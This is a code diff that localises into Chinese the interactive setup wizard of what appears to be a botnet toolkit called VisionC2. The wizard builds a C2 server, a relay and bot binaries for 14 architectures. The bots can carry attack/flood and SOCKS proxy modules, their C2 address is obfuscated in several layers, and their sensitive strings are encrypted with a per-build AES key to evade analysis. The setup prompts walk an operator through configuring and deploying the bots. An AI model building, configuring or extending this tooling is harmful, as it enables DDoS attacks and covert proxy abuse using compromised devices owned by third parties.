@@ -63,7 +63,7 @@ def print_banner():
       ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚══════╝
 {Colors.RESET}
 {Colors.BRIGHT_CYAN}              ═══════════════════════════════════════
-                    {Colors.BRIGHT_YELLOW}Interactive Setup Wizard{Colors.BRIGHT_CYAN}
+                    {Colors.BRIGHT_YELLOW}交互式初始化向导{Colors.BRIGHT_CYAN}
               ═══════════════════════════════════════{Colors.RESET}
 """
     print(banner)
@@ -508,38 +508,38 @@ def caps_to_build_tags(cap_attacks: bool, cap_socks: bool) -> str:
 
 def prompt_capabilities() -> tuple:
     """Prompt user to choose which modules to include in the bot build."""
-    print(f"\n{Colors.BRIGHT_CYAN}⚙  Bot Module Selection{Colors.RESET}")
-    print(f"{Colors.DIM}   Choose which capabilities to compile into bot binaries.{Colors.RESET}")
-    print(f"{Colors.DIM}   Disabling a module removes its code paths from the bot.{Colors.RESET}\n")
+    print(f"\n{Colors.BRIGHT_CYAN}⚙  Bot 模块选择{Colors.RESET}")
+    print(f"{Colors.DIM}   选择要编译进 Bot 二进制的能力。{Colors.RESET}")
+    print(f"{Colors.DIM}   禁用模块会从 Bot 中移除对应代码路径。{Colors.RESET}\n")
 
-    print(f"  {Colors.BRIGHT_RED}[1]{Colors.RESET} {Colors.BRIGHT_WHITE}Full (attacks + SOCKS){Colors.RESET}  — all modules enabled")
-    print(f"  {Colors.BRIGHT_YELLOW}[2]{Colors.RESET} {Colors.BRIGHT_WHITE}Attacks only{Colors.RESET}          — no SOCKS proxy module")
-    print(f"  {Colors.BRIGHT_BLUE}[3]{Colors.RESET} {Colors.BRIGHT_WHITE}SOCKS only{Colors.RESET}             — no attack/flood module")
-    print(f"  {Colors.DIM}[4]{Colors.RESET} {Colors.DIM}None{Colors.RESET}                    — shell/management only\n")
+    print(f"  {Colors.BRIGHT_RED}[1]{Colors.RESET} {Colors.BRIGHT_WHITE}完整（攻击 + SOCKS）{Colors.RESET}  — 启用所有模块")
+    print(f"  {Colors.BRIGHT_YELLOW}[2]{Colors.RESET} {Colors.BRIGHT_WHITE}仅攻击模块{Colors.RESET}          — 不包含 SOCKS 代理模块")
+    print(f"  {Colors.BRIGHT_BLUE}[3]{Colors.RESET} {Colors.BRIGHT_WHITE}仅 SOCKS 模块{Colors.RESET}             — 不包含攻击/流量模块")
+    print(f"  {Colors.DIM}[4]{Colors.RESET} {Colors.DIM}None{Colors.RESET}                    — 仅 Shell/管理\n")
 
-    choice = prompt("Select module profile", "1")
+    choice = prompt("选择模块配置", "1")
     if choice == "2":
         cap_attacks, cap_socks = True, False
-        success("Module profile: Attacks only")
+        success("模块配置： 仅攻击模块")
     elif choice == "3":
         cap_attacks, cap_socks = False, True
-        success("Module profile: SOCKS only")
+        success("模块配置： 仅 SOCKS 模块")
     elif choice == "4":
         cap_attacks, cap_socks = False, False
-        warning("Module profile: None (shell/management only)")
+        warning("模块配置： None (仅 Shell/管理)")
     else:
         cap_attacks, cap_socks = True, True
-        success("Module profile: Full (attacks + SOCKS)")
+        success("模块配置： 完整（攻击 + SOCKS）")
     return cap_attacks, cap_socks
 
 
 def prompt_debug_mode() -> bool:
     """Prompt user to set debug mode with explanation"""
-    print(f"\n{Colors.BRIGHT_CYAN}🔧 Debug Mode{Colors.RESET}")
+    print(f"\n{Colors.BRIGHT_CYAN}🔧 调试模式{Colors.RESET}")
     print(
         f"{Colors.DIM}   Logs function calls & connections to console (dev only){Colors.RESET}\n"
     )
-    return confirm("Would you like to enable debug mode?", default=False)
+    return confirm("是否启用调试模式？", default=False)
 
 
 def update_bot_main_go(
@@ -697,7 +697,7 @@ def generate_certificates(cnc_path: str, cert_config: dict) -> bool:
                 break
 
         # Generate private key
-        info("Generating 4096-bit RSA private key...")
+        info("正在生成 4096 位 RSA 私钥...")
         subprocess.run(
             ["openssl", "genrsa", "-out", key_path, "4096"],
             check=True,
@@ -706,7 +706,7 @@ def generate_certificates(cnc_path: str, cert_config: dict) -> bool:
         )
 
         # Generate certificate
-        info("Generating self-signed certificate...")
+        info("正在生成自签名证书...")
         subject = f"/C={cert_config['country']}/ST={cert_config['state']}/L={cert_config['city']}/O={cert_config['org']}/CN={cert_config['cn']}"
 
         subprocess.run(
@@ -733,12 +733,12 @@ def generate_certificates(cnc_path: str, cert_config: dict) -> bool:
         return True
     except subprocess.CalledProcessError as e:
         stderr_msg = e.stderr.decode().strip() if e.stderr else ""
-        error(f"Failed to generate certificates: {e}")
+        error(f"证书生成失败： {e}")
         if stderr_msg:
             error(f"OpenSSL error: {stderr_msg}")
         return False
     except FileNotFoundError:
-        error("OpenSSL not found. Please install: apt install openssl")
+        error("未找到 OpenSSL，请安装：apt install openssl")
         return False
 
 
@@ -762,7 +762,7 @@ def build_cnc(cnc_path: str) -> bool:
     """Build the CNC server"""
     try:
         go = find_go()
-        info(f"Building CNC server... ({go})")
+        info(f"正在构建 CNC 服务端... ({go})")
         env = dict(os.environ)
         env["CGO_ENABLED"] = "0"
         result = subprocess.run(
@@ -774,7 +774,7 @@ def build_cnc(cnc_path: str) -> bool:
         )
 
         if result.returncode != 0:
-            error(f"Build failed: {result.stderr}")
+            error(f"构建失败： {result.stderr}")
             return False
 
         # Copy binary to main directory as 'server'
@@ -782,11 +782,11 @@ def build_cnc(cnc_path: str) -> bool:
         src = os.path.join(cnc_path, "cnc")
         dst = os.path.join(base_path, "server")
         shutil.copy2(src, dst)
-        info(f"Copied CNC binary to {dst}")
+        info(f"CNC 二进制已复制到 {dst}")
 
         return True
     except FileNotFoundError:
-        error("Go not found. Please install Go 1.24+")
+        error("未找到 Go，请安装 Go 1.24+")
         return False
 
 
@@ -794,7 +794,7 @@ def build_relay(base_path: str) -> bool:
     """Build the relay server"""
     try:
         go = find_go()
-        info(f"Building relay server... ({go})")
+        info(f"正在构建 relay 服务端... ({go})")
         relay_path = os.path.join(base_path, "cnc", "relay")
         dst = os.path.join(base_path, "relay_server")
         env = dict(os.environ)
@@ -816,13 +816,13 @@ def build_relay(base_path: str) -> bool:
         )
 
         if result.returncode != 0:
-            error(f"Build failed: {result.stderr}")
+            error(f"构建失败： {result.stderr}")
             return False
 
-        info(f"Built relay binary to {dst}")
+        info(f"relay 二进制已构建到 {dst}")
         return True
     except FileNotFoundError:
-        error("Go not found. Please install Go 1.24+")
+        error("未找到 Go，请安装 Go 1.24+")
         return False
 
 
@@ -834,20 +834,20 @@ def build_bots(base_path: str, build_tags: str = "") -> bool:
         # Make build.sh executable
         os.chmod(build_script, 0o755)
 
-        info("Building bot binaries for 14 architectures...")
-        info("This may take a few minutes...")
+        info("正在构建 14 个架构的 Bot 二进制...")
+        info("这可能需要几分钟...")
         print()
 
         env = dict(os.environ)
         if build_tags:
             env["BOT_BUILD_TAGS"] = build_tags
-            info(f"Build tags: {build_tags}")
+            info(f"构建标签： {build_tags}")
 
         result = subprocess.run(["bash", build_script], cwd=base_path, text=True, env=env)
 
         return result.returncode == 0
     except Exception as e:
-        error(f"Build failed: {e}")
+        error(f"构建失败： {e}")
         return False
 
 
@@ -885,8 +885,8 @@ def save_config(base_path: str, config: dict):
         f.write("[Certificate]\n")
         f.write(f"Country: {config['cert']['country']}\n")
         f.write(f"State: {config['cert']['state']}\n")
-        f.write(f"City: {config['cert']['city']}\n")
-        f.write(f"Organization: {config['cert']['org']}\n")
+        f.write(f"城市: {config['cert']['city']}\n")
+        f.write(f"组织: {config['cert']['org']}\n")
         f.write(f"Common Name: {config['cert']['cn']}\n")
         f.write(f"Valid Days: {config['cert']['days']}\n\n")
 
@@ -913,7 +913,7 @@ def save_config(base_path: str, config: dict):
 def print_summary(config: dict):
     """Print final setup summary with all configuration details"""
     print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
-    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ SETUP COMPLETE!{Colors.RESET}")
+    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ 初始化完成！{Colors.RESET}")
     print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")
 
     print(
@@ -938,7 +938,7 @@ def print_summary(config: dict):
     )
     print()
 
-    print(f"{Colors.BRIGHT_CYAN}  Quick Start:{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}  快速开始：{Colors.RESET}")
     print(
         f"    TUI Mode:     {Colors.GREEN}./server{Colors.RESET}           (local interactive UI)"
     )
@@ -953,7 +953,7 @@ def print_summary(config: dict):
     print(
         f"    Login Trigger:{Colors.GREEN} spamtec{Colors.RESET}            (split mode only)"
     )
-    print(f"    Bot bins:     {Colors.GREEN}bins/{Colors.RESET}")
+    print(f"    Bot 产物：     {Colors.GREEN}bins/{Colors.RESET}")
     magic = config.get("magic_code", "<magic_code>")
     print(
         f"    Relay:        {Colors.GREEN}go build -o relay ./cnc/relay && ./relay -key {magic}{Colors.RESET}"
@@ -1107,7 +1107,7 @@ def print_menu():
         f"{Colors.DIM}  🏗️  Builds for 14 architectures (x86, ARM, MIPS, etc.){Colors.RESET}\n"
     )
 
-    choice = prompt("Select option", "1")
+    choice = prompt("选择选项", "1")
     return choice
 
 
@@ -1115,24 +1115,24 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     """Run full setup - everything new"""
     config = {}
 
-    # Debug Mode Configuration (before main setup)
+    # 调试模式 Configuration (before main setup)
     debug_enabled = prompt_debug_mode()
     config["debug_mode"] = debug_enabled
 
     if debug_enabled:
-        warning("Debug mode ENABLED - remember to disable for production!")
+        warning("调试模式已启用，生产环境请记得关闭！")
     else:
-        success("Debug mode disabled - ready for production")
+        success("调试模式已关闭，可用于生产环境")
     print()
 
-    # Bot Module Selection
+    # Bot 模块选择
     cap_attacks, cap_socks = prompt_capabilities()
     config["cap_attacks"] = cap_attacks
     config["cap_socks"] = cap_socks
     print()
 
     # Step 1: C2 Address
-    print_step(1, 5, "C2 Server Configuration")
+    print_step(1, 5, "C2 服务端配置")
 
     print(
         f"{Colors.DIM}   Enter IP or domain (no http:// prefix). Supports direct IP, A record, or TXT record.{Colors.RESET}"
@@ -1141,17 +1141,17 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
         f"{Colors.DIM}   Examples: 192.168.1.100 | c2.example.com | lookup.mydomain.com{Colors.RESET}\n"
     )
 
-    c2_ip = prompt("What is your C2 server IP or domain?", "127.0.0.1")
+    c2_ip = prompt("请输入 C2 服务端 IP 或域名", "127.0.0.1")
     c2_address = f"{c2_ip}:443"
     config["c2_address"] = c2_address
 
-    admin_port = prompt("What port would you like for admin CLI?", "420")
+    admin_port = prompt("请输入管理 CLI 端口", "420")
     config["admin_port"] = admin_port
 
     print()
     success(f"C2: {c2_address} | Admin port: {admin_port}")
 
-    info("Relay endpoints are managed at runtime via the CNC dashboard — add/remove without rebuilding")
+    info("中继端点通过 CNC 面板运行时管理 — add/remove without rebuilding")
 
     # Default SOCKS5 proxy credentials — auto-generated, unique per build
     _chars = string.ascii_letters + string.digits
@@ -1159,10 +1159,10 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     proxy_pass = "".join(random.choice(_chars) for _ in range(12))
     config["proxy_user"] = proxy_user
     config["proxy_pass"] = proxy_pass
-    success(f"Proxy auth (auto-generated): {proxy_user}:{proxy_pass}")
+    success(f"代理认证（自动生成）： {proxy_user}:{proxy_pass}")
 
     # Step 2: Security Tokens & AES Key
-    print_step(2, 5, "Security Token & Key Generation")
+    print_step(2, 5, "安全令牌与密钥生成")
 
     magic_code = generate_magic_code(16)
     protocol_version = generate_protocol_version()
@@ -1178,7 +1178,7 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
 
     # Generate random per-build AES key BEFORE C2 obfuscation
     # so derive_key_py and aes_ctr_encrypt use the new key
-    info("Generating per-build AES encryption key...")
+    info("正在生成本次构建专用 AES 加密密钥...")
     opsec_path = os.path.join(bot_path, "opsec.go")
     config_go_path = os.path.join(bot_path, "config.go")
     crypto_path = os.path.join(base_path, "tools", "crypto.go")
@@ -1192,21 +1192,21 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
 
     # Re-encrypt existing blobs (except rawServiceAddr, which gets patched below)
     encrypt_config_blobs(config_go_path, old_key, new_key)
-    success("Sensitive string blobs re-encrypted")
+    success("敏感字符串块已重新加密")
 
     # Obfuscate C2 (now uses the NEW key via garuda_key() / derive_key_py())
-    info("Applying multi-layer obfuscation...")
+    info("正在应用多层混淆...")
     obfuscated_c2 = obfuscate_c2(c2_address, crypt_seed)
     config["obfuscated_c2"] = obfuscated_c2
 
     if verify_obfuscation(obfuscated_c2, crypt_seed, c2_address):
-        success("C2 address obfuscation verified ✓")
+        success("C2 地址混淆已验证 ✓")
     else:
-        error("Obfuscation verification failed!")
+        error("混淆验证失败！")
         sys.exit(1)
 
     # Step 3: Certificates
-    print_step(3, 5, "TLS Certificates")
+    print_step(3, 5, "TLS 证书")
 
     print(
         f"{Colors.DIM}   TLS certs are required. You can self-sign here or use Let's Encrypt/your own.{Colors.RESET}"
@@ -1215,58 +1215,58 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
         f"{Colors.DIM}   Place your own certs at: cnc/certificates/server.crt and cnc/certificates/server.key{Colors.RESET}\n"
     )
 
-    print(f"  {Colors.BRIGHT_GREEN}[1]{Colors.RESET} Generate self-signed certificates")
+    print(f"  {Colors.BRIGHT_GREEN}[1]{Colors.RESET} 生成自签名证书")
     print(
         f"  {Colors.BRIGHT_YELLOW}[2]{Colors.RESET} I'll provide my own (Let's Encrypt, etc.)\n"
     )
 
-    cert_choice = prompt("Select option", "1")
+    cert_choice = prompt("选择选项", "1")
 
     if cert_choice == "1":
         print(
             f"\n{Colors.DIM}   Enter certificate details (press Enter for defaults):{Colors.RESET}\n"
         )
         cert_config = {
-            "country": prompt("Country code (2 letter)", "US"),
-            "state": prompt("State/Province", "California"),
-            "city": prompt("City", "San Francisco"),
-            "org": prompt("Organization", "Security Research"),
-            "cn": prompt("Common Name (domain)", c2_ip),
-            "days": int(prompt("Valid days", "365")),
+            "country": prompt("国家代码（2 位）", "US"),
+            "state": prompt("州/省", "California"),
+            "city": prompt("城市", "San Francisco"),
+            "org": prompt("组织", "Security Research"),
+            "cn": prompt("通用名称（域名）", c2_ip),
+            "days": int(prompt("有效天数", "365")),
         }
         config["cert"] = cert_config
 
         if not generate_certificates(cnc_path, cert_config):
-            error("Certificate generation failed!")
-            if not confirm("Would you like to continue anyway?"):
+            error("证书生成失败！")
+            if not confirm("仍然继续吗？"):
                 sys.exit(1)
         else:
-            success("Self-signed TLS certificates generated")
+            success("自签名 TLS 证书已生成")
     else:
         config["cert"] = {"custom": True}
-        warning("Remember to place server.crt and server.key in cnc/ folder")
+        warning("请记得将 server.crt 和 server.key 放入 cnc/ 目录")
 
     # Step 4: Update Source
-    print_step(4, 5, "Updating Source Code")
+    print_step(4, 5, "正在更新源码配置")
 
     print(
         f"{Colors.DIM}   Applying your configuration to source files...{Colors.RESET}\n"
     )
 
     if update_cnc_main_go(cnc_path, magic_code, protocol_version, admin_port):
-        success("CNC configured")
+        success("CNC 已配置")
     else:
-        error("Failed to update CNC")
+        error("CNC 更新失败")
 
     update_relay_config(base_path, magic_code)
-    success("Relay configured")
+    success("Relay 已配置")
 
     if update_bot_main_go(
         bot_path, magic_code, protocol_version, obfuscated_c2, crypt_seed
     ):
-        success("Bot configured")
+        success("Bot 已配置")
     else:
-        error("Failed to update Bot")
+        error("Bot 更新失败")
 
     if update_bot_debug_mode(bot_path, config["debug_mode"]):
         success(f"Debug mode: {'ON' if config['debug_mode'] else 'OFF'}")
@@ -1285,17 +1285,17 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     success(f"Proxy credentials: {config['proxy_user']}:{config['proxy_pass']}")
 
     # Step 5: Build
-    print_step(5, 5, "Building Binaries")
+    print_step(5, 5, "正在构建二进制")
 
-    if confirm("Would you like to build the CNC server?"):
+    if confirm("是否构建 CNC 服务端？"):
         if build_cnc(cnc_path):
-            success("CNC server built")
+            success("CNC 服务端已构建")
         else:
             warning("CNC build failed - build manually with: cd cnc && go build")
 
-    if confirm("Would you like to build the relay server?"):
+    if confirm("是否构建 relay 服务端？"):
         if build_relay(base_path):
-            success("Relay server built")
+            success("relay 服务端已构建")
         else:
             warning("Relay build failed - build manually with: go build -o relay ./cnc/relay")
 
@@ -1304,13 +1304,13 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     ):
         build_tags = caps_to_build_tags(config["cap_attacks"], config["cap_socks"])
         if build_bots(base_path, build_tags):
-            success("Bot binaries built")
+            success("Bot 二进制已构建")
         else:
             warning("Bot build had issues - check bins/")
 
     # Save config
     config_file = save_config(base_path, config)
-    info(f"Configuration saved to: {config_file}")
+    info(f"配置已保存到： {config_file}")
 
     print_summary(config)
 
@@ -1318,26 +1318,26 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
 def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
     """Update C2 URL only - keep existing magic code, protocol, certs"""
 
-    # Debug Mode Configuration (before main setup)
+    # 调试模式 Configuration (before main setup)
     debug_enabled = prompt_debug_mode()
 
     if debug_enabled:
-        warning("Debug mode ENABLED - remember to disable for production!")
+        warning("调试模式已启用，生产环境请记得关闭！")
     else:
-        success("Debug mode disabled - ready for production")
+        success("调试模式已关闭，可用于生产环境")
     print()
 
-    # Bot Module Selection
+    # Bot 模块选择
     cap_attacks, cap_socks = prompt_capabilities()
     print()
 
     # Get existing config
-    info("Reading existing configuration...")
+    info("正在读取现有配置...")
     existing = get_current_config(bot_path, cnc_path)
 
     if not existing.get("magic_code") or not existing.get("crypt_seed"):
-        error("Could not read existing configuration!")
-        error("Please run Full Setup instead.")
+        error("无法读取现有配置！")
+        error("请改用完整初始化。")
         return
 
     print()
@@ -1361,8 +1361,8 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
     config["crypt_seed"] = existing["crypt_seed"]
     config["admin_port"] = existing.get("admin_port", "420")
 
-    # Step 1: New C2 Address
-    print_step(1, 2, "New C2 Address")
+    # Step 1: 新的 C2 地址
+    print_step(1, 2, "新的 C2 地址")
 
     print(
         f"{Colors.DIM}   Enter IP or domain (no http:// prefix). Supports direct IP, A record, or TXT record.{Colors.RESET}"
@@ -1371,9 +1371,9 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
         f"{Colors.DIM}   Examples: 192.168.1.100 | c2.example.com | lookup.mydomain.com{Colors.RESET}\n"
     )
 
-    c2_ip = prompt("What is your new C2 server IP or domain?")
+    c2_ip = prompt("请输入新的 C2 服务端 IP 或域名")
     if not c2_ip:
-        error("C2 address is required!")
+        error("必须提供 C2 地址！")
         return
 
     c2_address = f"{c2_ip}:443"
@@ -1381,13 +1381,13 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
 
     success(f"New C2: {c2_address}")
 
-    # Step 2: Update & Build
-    print_step(2, 2, "Update & Build")
+    # Step 2: 更新并构建
+    print_step(2, 2, "更新并构建")
 
     print(f"{Colors.DIM}   Applying new C2 address and fresh AES key...{Colors.RESET}\n")
 
     # Generate random AES key FIRST so C2 obfuscation uses the new key
-    info("Generating per-build AES encryption key...")
+    info("正在生成本次构建专用 AES 加密密钥...")
     opsec_path = os.path.join(bot_path, "opsec.go")
     config_go_path = os.path.join(bot_path, "config.go")
     crypto_path = os.path.join(base_path, "tools", "crypto.go")
@@ -1401,16 +1401,16 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
 
     # Re-encrypt existing blobs with new key
     encrypt_config_blobs(config_go_path, old_key, new_key)
-    success("Sensitive string blobs re-encrypted")
+    success("敏感字符串块已重新加密")
 
     # Obfuscate C2 (now uses the NEW key via garuda_key() / derive_key_py())
     obfuscated_c2 = obfuscate_c2(c2_address, config["crypt_seed"])
     config["obfuscated_c2"] = obfuscated_c2
 
     if verify_obfuscation(obfuscated_c2, config["crypt_seed"], c2_address):
-        success("C2 address obfuscation verified ✓")
+        success("C2 地址混淆已验证 ✓")
     else:
-        error("Obfuscation verification failed!")
+        error("混淆验证失败！")
         sys.exit(1)
 
     # Update bot source with new C2 and existing tokens
@@ -1421,12 +1421,12 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
         obfuscated_c2,
         config["crypt_seed"],
     ):
-        success("Bot configured")
+        success("Bot 已配置")
     else:
-        error("Failed to update Bot")
+        error("Bot 更新失败")
 
     update_relay_config(base_path, config["magic_code"])
-    success("Relay configured")
+    success("Relay 已配置")
 
     if update_bot_debug_mode(bot_path, debug_enabled):
         success(f"Debug mode: {'ON' if debug_enabled else 'OFF'}")
@@ -1437,16 +1437,16 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
     socks_s = "ON" if cap_socks else "OFF"
     success(f"Bot modules: attacks={atk_s}, socks={socks_s}")
 
-    if confirm("Would you like to build the relay server?"):
+    if confirm("是否构建 relay 服务端？"):
         if build_relay(base_path):
-            success("Relay server built")
+            success("relay 服务端已构建")
         else:
             warning("Relay build failed - build manually with: go build -o relay ./cnc/relay")
 
-    if confirm("Would you like to build bot binaries? (takes a few mins)"):
+    if confirm("是否构建 Bot 二进制？（需要几分钟）"):
         build_tags = caps_to_build_tags(cap_attacks, cap_socks)
         if build_bots(base_path, build_tags):
-            success("Bot binaries built")
+            success("Bot 二进制已构建")
         else:
             warning("Bot build had issues - check bins/")
 
@@ -1458,7 +1458,7 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
     print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")
 
     print(
-        f"  {Colors.YELLOW}New C2 Address:{Colors.RESET}  {Colors.BRIGHT_WHITE}{c2_address}{Colors.RESET}"
+        f"  {Colors.YELLOW}新的 C2 地址:{Colors.RESET}  {Colors.BRIGHT_WHITE}{c2_address}{Colors.RESET}"
     )
     print(
         f"  {Colors.YELLOW}Magic Code:{Colors.RESET}      {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
@@ -1467,8 +1467,8 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
         f"  {Colors.YELLOW}Certificates:{Colors.RESET}    {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
     )
     print()
-    warning("Deploy new bot binaries from bins/")
-    warning("Existing bots will NOT auto-update - redeploy required")
+    warning("请从 bins/ 部署新的 Bot 二进制")
+    warning("现有 Bot 不会自动更新，需要重新部署")
     print()
 
 
@@ -1485,7 +1485,7 @@ def run_module_update(base_path: str, cnc_path: str, bot_path: str):
     if confirm("Would you like to build bot binaries? (14 architectures, takes a few mins)"):
         build_tags = caps_to_build_tags(cap_attacks, cap_socks)
         if build_bots(base_path, build_tags):
-            success("Bot binaries built")
+            success("Bot 二进制已构建")
         else:
             warning("Bot build had issues - check bins/")
     else:
@@ -1494,7 +1494,7 @@ def run_module_update(base_path: str, cnc_path: str, bot_path: str):
         info(f"Skipped build — to build manually: BOT_BUILD_TAGS={caps_to_build_tags(cap_attacks, cap_socks)} bash tools/build.sh")
 
     print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
-    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ MODULE UPDATE COMPLETE!{Colors.RESET}")
+    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ 模块更新完成！{Colors.RESET}")
     print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")
     atk_s = "ON" if cap_attacks else "OFF"
     socks_s = "ON" if cap_socks else "OFF"
@@ -1502,8 +1502,8 @@ def run_module_update(base_path: str, cnc_path: str, bot_path: str):
     print(f"  {Colors.YELLOW}SOCKS:{Colors.RESET}        {Colors.BRIGHT_WHITE}{socks_s}{Colors.RESET}")
     print(f"  {Colors.YELLOW}C2 / Tokens:{Colors.RESET}  {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}")
     print()
-    warning("Deploy new bot binaries from bins/")
-    warning("Existing bots will NOT auto-update - redeploy required")
+    warning("请从 bins/ 部署新的 Bot 二进制")
+    warning("现有 Bot 不会自动更新，需要重新部署")
     print()
 
 
@@ -1543,9 +1543,9 @@ def parse_setup_config(config_path: str) -> dict:
                     config.setdefault("cert", {})["country"] = value
                 elif key == "State":
                     config.setdefault("cert", {})["state"] = value
-                elif key == "City":
+                elif key == "城市":
                     config.setdefault("cert", {})["city"] = value
-                elif key == "Organization":
+                elif key == "组织":
                     config.setdefault("cert", {})["org"] = value
                 elif key == "Common Name":
                     config.setdefault("cert", {})["cn"] = value
@@ -1561,8 +1561,8 @@ def run_restore(base_path: str, cnc_path: str, bot_path: str):
     config_path = os.path.join(base_path, "setup_config.txt")
 
     if not os.path.exists(config_path):
-        error("setup_config.txt not found in project root.")
-        error("Run a Full Setup first to generate it.")
+        error("项目根目录未找到 setup_config.txt。")
+        error("请先运行完整初始化生成该文件。")
         return
 
     info(f"Reading saved config from: {config_path}")
@@ -1590,11 +1590,11 @@ def run_restore(base_path: str, cnc_path: str, bot_path: str):
     print(f"  {Colors.YELLOW}Bot modules:{Colors.RESET}      {Colors.BRIGHT_WHITE}attacks={atk_s}, socks={socks_s}{Colors.RESET}")
     print()
 
-    if not confirm("Apply this config and rebuild?"):
+    if not confirm("应用此配置并重新构建？"):
         return
 
     # Step 1: Fresh AES key (git pull resets opsec.go to repo state)
-    print_step(1, 3, "Generating Fresh AES Key")
+    print_step(1, 3, "生成新的 AES 密钥")
     opsec_path = os.path.join(bot_path, "opsec.go")
     config_go_path = os.path.join(bot_path, "config.go")
     crypto_path = os.path.join(base_path, "tools", "crypto.go")
@@ -1610,7 +1610,7 @@ def run_restore(base_path: str, cnc_path: str, bot_path: str):
     success("Existing blobs re-encrypted")
 
     # Step 2: Patch source files
-    print_step(2, 3, "Patching Source Files")
+    print_step(2, 3, "修补源码配置")
 
     # Re-obfuscate C2 using stored seed + new key
     c2_address = config["c2_address"]
@@ -1623,17 +1623,17 @@ def run_restore(base_path: str, cnc_path: str, bot_path: str):
     success("C2 address re-obfuscated and verified ✓")
 
     if update_cnc_main_go(cnc_path, config["magic_code"], config["protocol_version"], config["admin_port"]):
-        success("CNC configured")
+        success("CNC 已配置")
     else:
-        error("Failed to update CNC")
+        error("CNC 更新失败")
 
     update_relay_config(base_path, config["magic_code"])
-    success("Relay configured")
+    success("Relay 已配置")
 
     if update_bot_main_go(bot_path, config["magic_code"], config["protocol_version"], obfuscated_c2, crypt_seed):
-        success("Bot configured")
+        success("Bot 已配置")
     else:
-        error("Failed to update Bot")
+        error("Bot 更新失败")
 
     if config.get("proxy_user") and config.get("proxy_pass"):
         update_proxy_credentials(bot_path, config["proxy_user"], config["proxy_pass"])
@@ -1643,34 +1643,34 @@ def run_restore(base_path: str, cnc_path: str, bot_path: str):
         warning("Proxy credentials not found in setup_config.txt — skipping (run !socksauth to set them)")
 
     # Step 3: Build
-    print_step(3, 3, "Building Binaries")
+    print_step(3, 3, "正在构建二进制")
 
-    if confirm("Would you like to build the CNC server?"):
+    if confirm("是否构建 CNC 服务端？"):
         if build_cnc(cnc_path):
-            success("CNC server built")
+            success("CNC 服务端已构建")
         else:
             warning("CNC build failed - build manually with: cd cnc && go build")
 
-    if confirm("Would you like to build the relay server?"):
+    if confirm("是否构建 relay 服务端？"):
         if build_relay(base_path):
-            success("Relay server built")
+            success("relay 服务端已构建")
         else:
             warning("Relay build failed")
 
     if confirm("Would you like to build bot binaries? (14 architectures, takes a few mins)"):
         build_tags = caps_to_build_tags(config.get("cap_attacks", True), config.get("cap_socks", True))
         if build_bots(base_path, build_tags):
-            success("Bot binaries built")
+            success("Bot 二进制已构建")
         else:
             warning("Bot build had issues - check bins/")
 
     print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
-    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ RESTORE COMPLETE!{Colors.RESET}")
+    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ 恢复完成！{Colors.RESET}")
     print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")
     print(f"  {Colors.YELLOW}C2 Address:{Colors.RESET}  {Colors.BRIGHT_WHITE}{c2_address}{Colors.RESET}")
     print(f"  {Colors.YELLOW}Magic Code:{Colors.RESET}  {Colors.BRIGHT_WHITE}{config['magic_code']}{Colors.RESET}")
     print()
-    warning("Deploy new bot binaries from bins/ — existing bots will NOT auto-update")
+    warning("请从 bins/ 部署新的 Bot 二进制 — existing bots will NOT auto-update")
     print()
 
 
@@ -1685,7 +1685,7 @@ def main():
 
     # Verify paths exist
     if not os.path.exists(cnc_path) or not os.path.exists(bot_path):
-        error("Cannot find cnc/ or bot/ directories. Run this from VisionC2 root.")
+        error("未找到 cnc/ 或 bot/ 目录，请在 VisionC2 根目录运行。")
         sys.exit(1)
 
     print(f"{Colors.DIM}Working directory: {base_path}{Colors.RESET}")
@@ -1694,22 +1694,22 @@ def main():
     choice = print_menu()
 
     if choice == "1":
-        info("Starting Full Setup...")
+        info("开始完整初始化...")
         run_full_setup(base_path, cnc_path, bot_path)
     elif choice == "2":
-        info("Starting C2 URL Update...")
+        info("开始更新 C2 URL...")
         run_c2_update(base_path, cnc_path, bot_path)
     elif choice == "3":
-        info("Starting Module Update...")
+        info("开始模块更新...")
         run_module_update(base_path, cnc_path, bot_path)
     elif choice == "4":
-        info("Restoring from setup_config.txt...")
+        info("正在从 setup_config.txt 恢复...")
         run_restore(base_path, cnc_path, bot_path)
     elif choice == "0":
-        print("\nExiting.")
+        print("\n正在退出。")
         sys.exit(0)
     else:
-        error("Invalid option")
+        error("无效选项")
